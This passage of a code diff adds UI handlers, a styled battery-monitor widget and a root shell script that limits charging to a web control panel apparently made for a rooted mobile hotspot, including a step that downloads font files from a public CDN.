+        if (state.installed) await loadData();
+        await loadPolicyMap();
+        renderIntoPanel();
+        setAutoData(state.installed);
+        checkUpdateInBackground();
+    };
+
+    collapseGen('#collapse_ht_btn', '#collapse_ht', '#collapse_ht', async (newVal) => {
+        if (newVal === 'open') await initPanelState();
+        else { setAutoData(false); if (_clockTimer) { clearInterval(_clockTimer); _clockTimer = null; } }
+    });
+
+    if (localStorage.getItem('#collapse_ht') === 'open') {
+        initPanelState().catch(e => console.warn('[HT] init error:', e));
+    }
+})();
+    }, 200);
+
+    document.querySelector('#smart_clear_log').onclick = () => {
+        ACTIVITY_LOG = []
+        var logEl = document.querySelector('#smart_log_area')
+        if (logEl) logEl.value = ''
+        createToast('日志已清空')
+    }
+
+    // 绑定检查更新按钮
+    var _sdmUpdBtn = document.querySelector('#sdm_check_update_btn');
+    if (_sdmUpdBtn) _sdmUpdBtn.onclick = () => _sdmCheckUpdate();
+    // 后台静默检查更新
+    setTimeout(() => _sdmBgCheck(), 3000);
+    document.querySelector('#smart_clear_diaglog').onclick = () => {
+        DIAG_LOG = []
+        var diagEl = document.querySelector('#smart_diag_log')
+        if (diagEl) diagEl.value = ''
+        createToast('诊断日志已清空')
+    }
+
+    var _ticketSubmitBtn = document.querySelector('#smart_submit_ticket')
+    if (_ticketSubmitBtn) _ticketSubmitBtn.onclick = async () => { await submitTicket() }
+    var _ticketInputEl = document.querySelector('#smart_ticket_input')
+    if (_ticketInputEl) _ticketInputEl.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); submitTicket() }
+    })
+
+    // ===== 作者开关（小宇同学）=====
+    var _authorEnabled = false
+    try { _authorEnabled = localStorage.getItem('smart_author_enabled') === '1' } catch(e) {}
+    var _authorSwitchEl = document.getElementById('smart_author_switch')
+    var _authorDisplayEl = document.getElementById('smart_author_display')
+    var _updateAuthorDisplay = function() {
+        if (_authorSwitchEl) {
+            if (_authorEnabled) _authorSwitchEl.classList.add('_on')
+            else _authorSwitchEl.classList.remove('_on')
+        }
+        if (_authorDisplayEl) {
+            _authorDisplayEl.style.display = _authorEnabled ? 'inline-block' : 'none'
+        }
+        try { localStorage.setItem('smart_author_enabled', _authorEnabled ? '1' : '0') } catch(e) {}
+    }
+    if (_authorSwitchEl) {
+        _authorSwitchEl.onclick = function() {
+            _authorEnabled = !_authorEnabled
+            _updateAuthorDisplay()
+            if (typeof createToast === 'function') {
+                createToast(_authorEnabled ? '已显示作者：小宇同学' : '已隐藏作者', _authorEnabled ? 'green' : 'pink', 2000)
+            }
+        }
+    }
+    _updateAuthorDisplay()
+
+    // ===== 小宇点击特效 =====
+    var _xiaoyuActive = false
+    var _xiaoyuTimer = null
+    document.addEventListener('click', function(e) {
+        if (_xiaoyuActive) return
+        _xiaoyuActive = true
+        var el = document.createElement('div')
+        el.className = 'smart-xiaoyu-text'
+        el.textContent = '小宇'
+        el.style.left = e.clientX + 'px'
+        el.style.top = e.clientY + 'px'
+        document.body.appendChild(el)
+        if (_xiaoyuTimer) clearTimeout(_xiaoyuTimer)
+        _xiaoyuTimer = setTimeout(function() {
+            if (el && el.parentNode) el.parentNode.removeChild(el)
+            _xiaoyuActive = false
+        }, 500)
+    }, true)
+
+    // ===== 旧音乐播放器代码已移除（已替换为 NMP v2）=====
+
+    // ===== 刷新间隔设置和手动刷新 =====
+    var intervalSelect = document.querySelector('#smart_scan_interval')
+    if (intervalSelect) {
+        // 从 localStorage 恢复上次设置
+        var savedInterval = null
+        try { savedInterval = localStorage.getItem('smart_scan_interval_ms') } catch(e) {}
+        if (savedInterval) {
+            intervalSelect.value = savedInterval
+            SCAN_INTERVAL_MS = parseInt(savedInterval) || 10000
+        }
+        intervalSelect.onchange = function() {
+            SCAN_INTERVAL_MS = parseInt(this.value) || 10000
+            try { localStorage.setItem('smart_scan_interval_ms', String(SCAN_INTERVAL_MS)) } catch(e) {}
+            // 重启定时器
+            if (SCAN_INTERVAL) { try { SCAN_INTERVAL() } catch(e) {} SCAN_INTERVAL = null }
+            SCAN_INTERVAL = requestInterval(function() { scanDevices() }, SCAN_INTERVAL_MS)
+            addDiagLog('扫描间隔已设为 ' + (SCAN_INTERVAL_MS / 1000) + ' 秒', 'success')
+            createToast('刷新间隔: ' + (SCAN_INTERVAL_MS / 1000) + '秒', 'pink', 2000)
+        }
+    }
+    var refreshBtn = document.querySelector('#smart_refresh_now')
+    if (refreshBtn) {
+        refreshBtn.onclick = async function() {
+            if (_isScanning) {
+                createToast('正在扫描中，请稍候...', 'pink', 2000)
+                return
+            }
+            createToast('正在刷新设备列表...', 'pink', 2000)
+            await scanDevices()
+        }
+    }
+    // 【防重复注入】用if块包裹整个电池插件代码，避免return跳过SmartDeviceManager后续初始化
+    if (!document.getElementById('BATTERY_PRO_CONTAINER')) {
+        console.log("Battery Pro plugin initializing...");
+
+    // 0. 🛠️ 工具函数：智能等待元素出现 
+    const waitForElement = (selector, timeout = 10000) => {
+        return new Promise((resolve) => {
+            if (document.querySelector(selector)) {
+                return resolve(document.querySelector(selector));
+            }
+            const observer = new MutationObserver((mutations, obs) => {
+                const el = document.querySelector(selector);
+                if (el) {
+                    resolve(el);
+                    obs.disconnect();
+                }
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+            setTimeout(() => {
+                observer.disconnect();
+                resolve(null); 
+            }, timeout);
+        });
+    };
+
+    const style = document.createElement('style');
+    style.textContent = `
+    /* 【字体修复】多源@font-face：本地文件优先 → jsdelivr CDN(fastly镜像) → jsdelivr CDN(默认)
+       注意：src里只能放字体文件(woff2)，不能放CSS链接 */
+    @font-face {
+        font-family: 'JetBrains Mono';
+        src: url('fonts/JetBrainsMono-700.woff2') format('woff2'),
+             url('https://fastly.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-700-normal.woff2') format('woff2'),
+             url('https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-700-normal.woff2') format('woff2');
+        font-weight: 700;
+        font-display: swap;
+    }
+    @font-face {
+        font-family: 'JetBrains Mono';
+        src: url('fonts/JetBrainsMono-800.woff2') format('woff2'),
+             url('https://fastly.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-800-normal.woff2') format('woff2'),
+             url('https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-800-normal.woff2') format('woff2');
+        font-weight: 800;
+        font-display: swap;
+    }
+    #BATTERY_PRO_CONTAINER, #BATTERY_PRO_CONTAINER * { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+    box-sizing: border-box; }
+    .bp-preload, .bp-preload * { transition: none !important;
+    }
+    #BATTERY_PRO_CONTAINER { width: 100%; margin: 10px 0; display: flex; flex-direction: column; position: relative; gap: 0;
+    transform: translateZ(0); opacity: 1;
+    }
+    /* ===== 琥珀呼吸光晕边框（新版：替代彩虹流水灯） ===== */
+    .bp-flowing-border {
+        position: relative;
+        border-radius: 20px;
+        overflow: hidden;
+    }
+    .bp-flowing-border::before {
+        content: '';
+        position: absolute;
+        inset: 0;
+        border-radius: 20px;
+        border: 1px solid rgba(245, 158, 11, .35);
+        box-shadow: inset 0 0 18px rgba(245, 158, 11, .06);
+        animation: bp-amber-breathe 3.2s ease-in-out infinite;
+        pointer-events: none;
+        z-index: 10;
+    }
+    @keyframes bp-amber-breathe {
+        0%, 100% { border-color: rgba(245, 158, 11, .28); box-shadow: inset 0 0 12px rgba(245, 158, 11, .04); }
+        50% { border-color: rgba(251, 191, 36, .65); box-shadow: inset 0 0 24px rgba(245, 158, 11, .12); }
+    }
+    /* ===== 暖光扫过效果（新版：替代水中倒影） ===== */
+    .bp-water-reflection {
+        position: relative;
+    }
+    .bp-water-reflection::after {
+        content: '';
+        position: absolute;
+        inset: 0;
+        border-radius: inherit;
+        background: linear-gradient(115deg,
+            transparent 30%,
+            rgba(251, 191, 36, .05) 44%,
+            rgba(254, 243, 199, .09) 50%,
+            rgba(251, 191, 36, .05) 56%,
+            transparent 70%);
+        animation: bp-warm-sweep 5s ease-in-out infinite;
+        pointer-events: none;
+        z-index: 1;
+    }
+    @keyframes bp-warm-sweep {
+        0%, 100% { transform: translateX(0); opacity: .4; }
+        50% { transform: translateX(6px); opacity: .85; }
+    }
+    /* ===== 交互悬浮效果 ===== */
+    .bp-interactive {
+        transition: transform .3s cubic-bezier(0.175, 0.885, 0.32, 1.275),
+                    box-shadow .3s ease,
+                    filter .3s ease;
+    }
+    .bp-interactive:hover {
+        transform: translateY(-2px) scale(1.005);
+        box-shadow: 0 8px 30px rgba(245, 158, 11, .13);
+        filter: brightness(1.06);
+    }
+    .bp-interactive:active {
+        transform: translateY(0) scale(0.99);
+        transition: transform .1s ease;
+    }
+    .bp-interactive .bp-data-card:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 4px 15px rgba(245, 158, 11, .15);
+    }
+   #battery_ring, #header_ring_path {
+        transition: stroke-dashoffset 0.3s cubic-bezier(0.25, 1, 0.5, 1); //圆环特效
+    }
+    .bp-header-block { background: linear-gradient(135deg, rgba(32, 24, 12, .88), rgba(15, 18, 26, .92)); backdrop-filter: blur(30px) saturate(140%); border-radius: 20px 20px 0 0;
+    padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; border: 1px solid rgba(245, 158, 11, .18); border-bottom: none; margin-bottom: 0;
+    box-shadow: 0 6px 24px rgba(0, 0, 0, .35); position: relative; z-index: 2;
+   transition: border-radius 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275), margin-bottom 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    .bp-header-block.is-collapsed { border-radius: 20px !important; border-bottom: 1px solid rgba(245, 158, 11, .18);
+    }
+    .bp-logo-area { display: flex; align-items: center; gap: 12px; flex-shrink: 0;
+    }
+    .bp-logo-box { width: 42px; height: 42px; background: linear-gradient(145deg, rgba(245, 158, 11, .2), rgba(120, 53, 15, .3)); border-radius: 50% 50% 50% 10px; display: flex;
+    align-items: center; justify-content: center; position: relative; overflow: hidden; border: 1px solid rgba(251, 191, 36, .38); flex-shrink: 0; transition: 0.2s;
+    box-shadow: 0 0 14px rgba(245, 158, 11, .18);
+    }
+    .bp-title-group { display: flex; flex-direction: column; justify-content: center; white-space: nowrap;
+    }
+    .bp-main-title { font-size: 17px; font-weight: 800; color: #fef3c7; line-height: 1.1; display: flex; align-items: center; gap: 6px;
+    letter-spacing: 1px; }
+    .bp-sub-title { font-size: 12px; color: rgba(251, 191, 36, .75); font-weight: 600; margin-top: 4px; letter-spacing: 1px;
+    }
+   .bp-header-summary { flex: 1; display: flex; justify-content: flex-end; align-items: center; gap: 18px; margin-right: 14px; opacity: 0;
+    transform: translateX(-20px); pointer-events: none; transition: all 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+
+    .bp-header-block.is-collapsed .bp-header-summary { opacity: 1;
+    transform: translateX(0); pointer-events: auto; }
+    #header_cpu_temp_container { display: none; }
+    .bp-header-block.is-collapsed #header_cpu_temp_container { display: flex; }
+    .bp-summary-item { display: flex; align-items: center; gap: 3px; font-size: 14px; font-weight: 700;
+    color: rgba(254, 243, 199, .92); }
+    .bp-summary-val { font-family: 'JetBrains Mono', monospace; font-size: 16px; display: inline-block; text-align: right;
+    }
+    #header_power { min-width: 45px; } #header_temp { min-width: 30px;
+    }
+    .bp-charge-ctrl-btn { position: absolute; right: 90px; top: 50%; transform: translate(0, -50%); display: flex; align-items: center;
+    gap: 6px; background: linear-gradient(135deg, rgba(245, 158, 11, .22), rgba(180, 83, 9, .3)); border: 1px solid rgba(251, 191, 36, .45); color: #fbbf24; border-radius: 999px;
+   padding: 6px 14px; font-size: 12px; font-weight: bold; cursor: pointer; opacity: 1; pointer-events: auto; transition: all 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    z-index: 25; box-shadow: 0 0 10px rgba(245, 158, 11, .2); }
+    .bp-charge-ctrl-btn:active { background: rgba(245, 158, 11, .35);
+    }
+    .bp-header-block.is-collapsed .bp-charge-ctrl-btn { opacity: 0; transform: translate(20px, -50%); pointer-events: none;
+    }
+    .bp-monitor-switch { position: relative; width: 44px; height: 24px; display: inline-block; flex-shrink: 0;
+    }
+    .bp-monitor-switch input { opacity: 0; width: 0; height: 0;
+    }
+    .bp-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(254, 243, 199, .08);
+    transition: .4s; border-radius: 34px; border: 1px solid rgba(245, 158, 11, .25); }
+    .bp-slider:before { position: absolute; content: ""; height: 18px;
+    width: 18px; left: 3px; top: 50%; transform: translateY(-50%); background: linear-gradient(180deg, #fde68a, #f59e0b); transition: .4s; border-radius: 50%; box-shadow: 0 2px 6px rgba(245, 158, 11, .5);
+    }
+    input:checked + .bp-slider { background-color: rgba(245, 158, 11, .35); border-color: rgba(251, 191, 36, .6);
+    }
+    input:checked + .bp-slider:before { transform: translate(20px, -50%);
+    }
+   .bp-body-block { background: linear-gradient(180deg, rgba(15, 18, 26, .92), rgba(12, 15, 22, .96)); backdrop-filter: blur(30px); border-radius: 0 0 20px 20px;
+    border: 1px solid rgba(245, 158, 11, .12); border-top: none; overflow: hidden; display: flex; flex-direction: column; position: relative; z-index: 1; max-height: 500px; opacity: 1;
+    transition: max-height 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.4s ease;
+    }
+    .bp-body-block.collapsed { max-height: 0; opacity: 0; padding-bottom: 0 !important; border-bottom: none !important; pointer-events: none;
+    }
+    .bp-content-container { padding: 22px; transform: translateY(0); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.6); }
+    .bp-body-block.collapsed .bp-content-container { transform: translateY(-20px); }
+    .bp-layout-grid { display: grid; grid-template-columns: 1fr 1.2fr;
+    gap: 18px; align-items: center; }
+   .bp-ring-container { display: flex; flex-direction: column; align-items: center; justify-content: center; background: none; border: none; padding: 15px; }
+    .bp-ring-box-inner { position: relative; width: 130px; height: 130px;
+    }
+    .bp-data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+    }
+    /* 新版数据卡：对角切角 + 左侧能量条 */
+    .bp-data-card { background: linear-gradient(160deg, rgba(245, 158, 11, .08), rgba(32, 26, 15, .38)); padding: 10px 10px 10px 14px; border-radius: 4px 14px 4px 14px; height: 70px; box-sizing: border-box;
+    display: flex; flex-direction: column; justify-content: center; align-items: flex-start; border: 1px solid rgba(245, 158, 11, .16); border-left: 3px solid rgba(251, 191, 36, .55); transition: all .3s cubic-bezier(0.175,0.885,0.32,1.275);
+    position: relative; overflow: hidden;
+    }
+    .bp-data-card:hover { background: linear-gradient(160deg, rgba(245, 158, 11, .16), rgba(42, 34, 18, .5)); transform: translateY(-2px) scale(1.02);
+        box-shadow: 0 4px 15px rgba(245, 158, 11, .18);
+        border-color: rgba(251, 191, 36, .4); border-left-color: #fbbf24;
+    }
+    .bp-data-card:active { transform: translateY(0) scale(0.98); }
+    .bp-data-card::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(251, 191, 36, .12), transparent);
+        transition: left .6s ease;
+    }
+    .bp-data-card:hover::after { left: 100%; }
+    .bp-data-label { font-size: 12px; color: #fbbf24; margin-bottom: 4px; width: 100%; text-align: left; letter-spacing: .5px; }
+    .bp-data-val { font-size: 18px; font-weight: 700; color: #fef3c7; font-family: 'JetBrains Mono', monospace; width: 100%; text-align: center; }
+    .bp-unit { font-size: 12px; color: rgba(254, 243, 199, .4); margin-left: 2px;
+    }
+/* 可点击光环样式与温度卡片样式 */
+.bp-ring-clickable { cursor: pointer; transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+.bp-ring-clickable:active { transform: scale(0.92); }
+.bp-temp-card { display: block !important; padding: 8px 10px !important; position: relative; overflow: hidden; }
+.bp-temp-header { display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 2; }
+
+    @media (max-width: 768px) {
+        .bp-header-block { padding: 12px 14px;
+        }
+        .bp-logo-box { width: 36px; height: 36px;
+        }
+        .bp-main-title { font-size: 15px;
+        }
+        .bp-sub-title { font-size: 11px;
+        }
+        .bp-content-container { padding: 12px;
+        }
+        .bp-layout-grid { grid-template-columns: 1fr 1.3fr; gap: 10px; align-items: center;
+        }
+        .bp-ring-container { padding: 0; background: none; border: none; display: flex; justify-content: center;
+        align-items: center; }
+        .bp-ring-box-inner { transform: scale(0.9); transform-origin: center;
+        }
+        .bp-data-grid { gap: 6px;
+        }
+        .bp-data-card { height: 55px; padding: 6px 8px 6px 12px;
+        }
+        .bp-data-label { font-size: 10px; margin-bottom: 2px;
+        }
+        .bp-data-val { font-size: 15px;
+        }
+
+        /* 手机端卡片右上角的温度和功率字号统一调小 */
+        #battery_temp, #battery_power { font-size: 11px !important; }
+        #battery_temp { margin-right: -7px; }
+        #battery_power { margin-right: -2px; }
+
+        /* 统一调小手机端右上角的单位（°C 和 W） */
+        #battery_temp .bp-unit, #battery_power .bp-unit {
+            font-size: 9px !important;
+            margin-left: 1px;
+        }
+        .bp-charge-ctrl-btn { right: 70px; padding: 4px 10px; font-size: 11px;
+        }
+        .bp-header-summary { margin-right: 5px; gap: 6px; opacity: 0;
+        }
+        .bp-summary-item { font-size: 11px; gap: 0px;
+        }
+        .bp-summary-val { font-size: 13px; white-space: nowrap;
+        }
+        #header_power { min-width: 38px; text-align: right; display: inline-block;
+        }
+        #header_temp { min-width: 30px; text-align: right; display: inline-block;
+        }
+    }
+
+/* 能量脉冲动效*/
+    @keyframes bp-energy-pulse {
+        0%, 100% { 
+            transform: translate(-50%, -50%) scale(1);
+        }
+        50% { 
+            transform: translate(-50%, -50%) scale(1.3); 
+        }
+    }
+    .bp-pulse-active {
+        animation: bp-energy-pulse 1.5s ease-in-out infinite; 
+    }
+
+    `;
+    document.head.appendChild(style);
+
+    // 【字体修复】延迟3秒下载字体，避免阻塞初始化
+    setTimeout(function() {
+        (async () => {
+            try {
+                var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+                if (!_rs) return
+                var fontDir = '/data/data/com.minikano.f50_sms/files/fonts'
+                await _rs('mkdir -p ' + fontDir + ' 2>/dev/null')
+                // 检查是否已有字体文件
+                var checkRes = await _rs('[ -f ' + fontDir + '/JetBrainsMono-700.woff2 ] && echo yes || echo no')
+                if ((checkRes.content || '').trim() === 'yes') return // 已有则跳过
+                // 【字体修复】下载700(粗体)和800(特粗)两个字重，使用fastly镜像优先+jsdelivr兜底
+                var _f700 = 'https://fastly.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-700-normal.woff2'
+                var _f800 = 'https://fastly.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-800-normal.woff2'
+                var _f700b = 'https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-700-normal.woff2'
+                var _f800b = 'https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.2.8/files/jetbrains-mono-latin-800-normal.woff2'
+                await _rs('timeout 10s wget -q -O ' + fontDir + '/JetBrainsMono-700.woff2 "' + _f700 + '" 2>/dev/null || timeout 10s curl -sL -o ' + fontDir + '/JetBrainsMono-700.woff2 "' + _f700 + '" 2>/dev/null || timeout 10s curl -sL -o ' + fontDir + '/JetBrainsMono-700.woff2 "' + _f700b + '" 2>/dev/null')
+                await _rs('timeout 10s wget -q -O ' + fontDir + '/JetBrainsMono-800.woff2 "' + _f800 + '" 2>/dev/null || timeout 10s curl -sL -o ' + fontDir + '/JetBrainsMono-800.woff2 "' + _f800 + '" 2>/dev/null || timeout 10s curl -sL -o ' + fontDir + '/JetBrainsMono-800.woff2 "' + _f800b + '" 2>/dev/null')
+                await _rs('chmod 644 ' + fontDir + '/*.woff2 2>/dev/null')
+                console.log('[BP] JetBrains Mono font downloaded to local')
+            } catch(e) { console.log('[BP] Font download skipped:', e) }
+        })()
+    }, 3000)
+
+// 1. 预读取折叠状态
+const COLLAPSE_KEY = 'bp_collapse_status';
+const isClosed = localStorage.getItem(COLLAPSE_KEY) === 'closed';
+
+// 2. 动态生成 HTML（琥珀能量核心主题）
+const htmlStructure = `
+    <div id="BATTERY_PRO_CONTAINER" class="bp-preload bp-flowing-border bp-water-reflection bp-interactive" style="display:none;">
+        <div class="bp-header-block ${isClosed ? 'is-collapsed' : ''}" id="bp_header">
+            <div class="bp-logo-area">
+                <div class="bp-logo-box">
+                    <svg width="32" height="32" viewBox="0 0 36 36">
+                        <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="rgba(245,158,11,.2)" stroke-width="4" />
+                        <path id="header_ring_path" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="transparent" stroke-width="4" stroke-dasharray="100, 100" stroke-dashoffset="100" stroke-linecap="round" />
+                    </svg>
+                    <div id="header_icon_container" style="width:18px; height:18px; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); display:flex; align-items:center; justify-content:center; color:#fbbf24;"></div>
+                </div>
+                <div class="bp-title-group">
+                    <div class="bp-main-title">🔋 电池管家</div>
+                    <div class="bp-sub-title" id="header_status_text">状态检测...</div>
+                </div>
+            </div>
+
+                 <div class="bp-charge-ctrl-btn" id="bp_open_charge_btn"><span>⚡ 充电管理</span></div>
+
+            <div class="bp-header-summary">
+                <div class="bp-summary-item">
+                    <span style="color:#fbbf24">功率</span>
+                    <span class="bp-summary-val" id="header_power">--</span>W
+                </div>
+                <div class="bp-summary-item" id="header_cpu_temp_container">
+                <span style="color:#22d3ee; margin-right: 4px;">CPU</span>
+                <span class="bp-summary-val" id="header_cpu_temp">--.-</span><span style="font-size: 14px;">℃</span>
+              </div>
+            </div>
+
+            <label class="bp-monitor-switch">
+                <input type="checkbox" id="bp_collapse_toggle" ${isClosed ? '' : 'checked'}>
+                <span class="bp-slider"></span>
+            </label>
+        </div>
+
+        <div class="bp-body-block ${isClosed ? 'collapsed' : ''}" id="bp_body_main">
+           <div class="bp-content-container">
+                <div class="bp-layout-grid">
+                     <div class="bp-ring-container">
+                        <div class="bp-ring-box-inner bp-ring-clickable" id="bp_ring_trigger" title="点击查看电量使用曲线">
+                             <svg width="130" height="130" viewBox="0 0 160 160">
+                                 <circle cx="80" cy="80" r="70" fill="none" stroke="rgba(245,158,11,.16)" stroke-width="9" />
+                                <circle id="battery_ring" cx="80" cy="80" r="70" fill="none" stroke="transparent" stroke-width="9" stroke-dasharray="439.6" stroke-dashoffset="439.6" stroke-linecap="round" transform="rotate(-90 80 80)" />
+                                <text id="battery_percent" x="80" y="76" text-anchor="middle" dominant-baseline="middle" font-size="28" fill="#fef3c7" font-weight="800">--%</text>
+                                 <text id="battery_time_label" x="80" y="108" text-anchor="middle" dominant-baseline="middle" font-size="13" font-weight="600" fill="#fbbf24">预估</text>
+                                 <text id="battery_time_val" x="80" y="126" text-anchor="middle" dominant-baseline="middle" font-size="14" font-weight="700" font-family="'JetBrains Mono', monospace" fill="#fef3c7">计算中</text>
+                             </svg>
+                             <div id="battery_icon_main" style="width:24px; height:24px; position: absolute; top: 26px; left: 50%; transform: translateX(-50%); display:flex; align-items:center; justify-content:center;"></div>
+                        </div>
+                    </div>
+
+                    <div class="bp-data-grid">
+                        <div class="bp-data-card">
+                            <div class="bp-data-label">电压 </div>
+                            <div id="battery_voltage" class="bp-data-val">--</div>
+                        </div>
+
+                        <div class="bp-data-card">
+                             <div class="bp-data-label">电流 </div>
+                            <div id="battery_current" class="bp-data-val">--</div>
+                        </div>
+
+                        <div class="bp-data-card bp-temp-card">
+                            <div class="bp-temp-header">
+                                <div class="bp-data-label" style="width: auto; margin:0;">功率 </div>
+                                <div id="battery_power" class="bp-data-val" style="width: auto; text-align: right; color: #fef3c7;">--</div>
+                            </div>
+                            <canvas id="power_chart_canvas" style="position: absolute; bottom: 0; left: 0; width: 100%; height: 45px; z-index: 1; pointer-events: none; opacity: 0.85;"></canvas>
+                        </div>
+
+                        <div class="bp-data-card bp-temp-card">
+                        <div class="bp-temp-header">
+                        <div class="bp-data-label" style="width: auto; margin:0;">温度 </div>
+                        <div id="battery_temp" class="bp-data-val" style="width: auto; text-align: right; color: #22d3ee;">--</div>
+                        </div>
+                        <canvas id="temp_chart_canvas" style="position: absolute; bottom: 0; left: 0; width: 100%; height: 45px; z-index: 1; pointer-events: none; opacity: 0.85;"></canvas>
+                       </div>
+                    </div>
+                </div>
+             </div>
+
+             <div id="bp_battery_chart_modal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 17, 24, 0.97); backdrop-filter: blur(10px); z-index: 10; border-radius: 0 0 20px 20px; flex-direction: column; padding: 20px; box-sizing: border-box;">
+                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                     <div style="color: #fef3c7; font-weight: bold; font-size: 14px;">🔋 电量使用曲线 (24小时)</div>
+                     <div id="bp_close_chart_btn" style="color: #f87171; cursor: pointer; font-size: 26px; line-height: 1; font-weight: normal; padding: 0 10px;">×</div>
+                 </div>
+                 <div style="flex: 1; position: relative; width: 100%; height: 100%;">
+                     <canvas id="level_chart_canvas" style="width: 100%; height: 100%;"></canvas>
+                 </div>
+             </div>
+             </div> </div> `;
+
+     const container = await waitForElement('.functions-container');
+    if (container) {
+        container.insertAdjacentHTML("afterend", htmlStructure);
+setTimeout(() => {
+    const el = document.getElementById('BATTERY_PRO_CONTAINER');
+    if(el) {
+        el.style.display = '';
+        el.classList.add('bp-loaded'); 
+        setTimeout(() => {
+             el.classList.remove('bp-preload'); 
+        }, 20);
+    }
+}, 15); 
+    } else {
+        console.error("BATTERY_PRO: 超时未找到挂载点 .functions-container，插件停止加载");
+    }
+
+  
+    // ==========================================
+    // 模块一：充电控制器 
+    // ==========================================
+    const CONFIG_FILE = "/sdcard/kano_charge_control_config.conf"
+    const SH_FILE = "/sdcard/kano_charge_control.sh"
+    const LOG_FILE = "/sdcard/kano_charge_control_log.log"
+    const BOOT_SH_FILE = "/sdcard/ufi_tools_boot.sh"
+    const NAME = "kano_charge_control"
+    
+    let CONFIG = { enabled: false, max_charge: 80, start_charge: 1 }
+
+    // 原版 Shell 脚本
+    const SCRIPT_CONTENT = `#!/system/bin/sh
+CONFIG_FILE="${CONFIG_FILE}"
+LOG_FILE="${LOG_FILE}"
+CHECK_INTERVAL=10
+
+CHARGE_PATHS=(
+  "/sys/class/power_supply/interface/battery_charging_enabled"
+  "/sys/class/zte_power_supply/zte_battery/battery_charging_enabled"
+  "/sys/class/power_supply/battery/battery_charging_enabled"
+)
+
+BATTERY_STATUS_PATH="/sys/class/power_supply/battery/status"
+CAPACITY_PATH="/sys/class/power_supply/battery/capacity"
+
+rm -rf "$LOG_FILE"
+
+is_magisk_env() {
+    [ -d /sbin/.magisk ] || command -v magisk >/dev/null
+}
+
+log() {
+    echo "$(date '+%Y-%m-%d %H:%M:%S') $1" >> "$LOG_FILE"
+    # 头部保留3行(含新增提示)，尾部保留10行，总共13行
+    # 如果总行数超过 13 行，触发拼接裁剪
+    if [ "$(wc -l < "$LOG_FILE")" -gt 13 ]; then
+        (head -n 3 "$LOG_FILE"; tail -n 10 "$LOG_FILE") > "${LOG_FILE}.tmp" && mv "${LOG_FILE}.tmp" "$LOG_FILE"
+    fi
+}
+
+get_current_switch_state() {
+    for path in "\${CHARGE_PATHS[@]}"; do
+        if [ -r "$path" ]; then
+            state=$(cat "$path" 2>/dev/null)
+            if [ "$state" = "0" ] || [ "$state" = "1" ]; then
+                echo "$state"
+                return
+            fi
+        fi
+    done
+    echo "-1"
+}
+
+get_physical_charging_status() {
+    if [ -r "$BATTERY_STATUS_PATH" ]; then
+        status=$(cat "$BATTERY_STATUS_PATH" 2>/dev/null)
+        case "$status" in
+            "Charging"|"Full") echo "1" ;;
+            "Discharging") echo "0" ;;
+            *) echo "-1" ;;
+        esac
+    else
+        echo "-1"
+    fi
+}
+
+apply_switch_state() {
+    target="$1"
+    for path in "\${CHARGE_PATHS[@]}"; do
+        if [ -w "$path" ]; then
+            echo "$target" > "$path"
+            sleep 0.1
+            if [ "$(cat "$path" 2>/dev/null)" = "$target" ]; then
+                log "充电开关已设置为 $target"
+                return
+            fi
+        fi
+    done
+    log "未能成功设置充电开关为 $target"
+}
+
+handle_charging_logic() {
+    if [ ! -f "$CONFIG_FILE" ]; then
+        log "配置文件不存在：$CONFIG_FILE"
+        return
+    fi
+
+    MAX_CHARGE=$(grep '^max_charge=' "$CONFIG_FILE" | cut -d= -f2)
+    START_CHARGE=$(grep '^start_charge=' "$CONFIG_FILE" | cut -d= -f2)
+
+    if [ -z "$MAX_CHARGE" ] || [ -z "$START_CHARGE" ]; then
+        log "配置文件格式错误"
+        return
+    fi
+
+    if [ ! -f "$CAPACITY_PATH" ]; then
+        log "无法读取电池容量"
+        return
+    fi
+
+    CAPACITY=$(cat "$CAPACITY_PATH")
+    CURRENT_SWITCH_STATE=$(get_current_switch_state)
+    CURRENT_PHYSICAL_CHARGING=$(get_physical_charging_status)
+
+    TARGET_SWITCH_STATE=$CURRENT_SWITCH_STATE
+
+    if [ "$CAPACITY" -ge "$MAX_CHARGE" ]; then
+        TARGET_SWITCH_STATE=0
+    elif [ "$CAPACITY" -ge "$START_CHARGE" ] && [ "$CAPACITY" -lt "$MAX_CHARGE" ]; then
+        TARGET_SWITCH_STATE=1
+    else
+        TARGET_SWITCH_STATE=$CURRENT_SWITCH_STATE
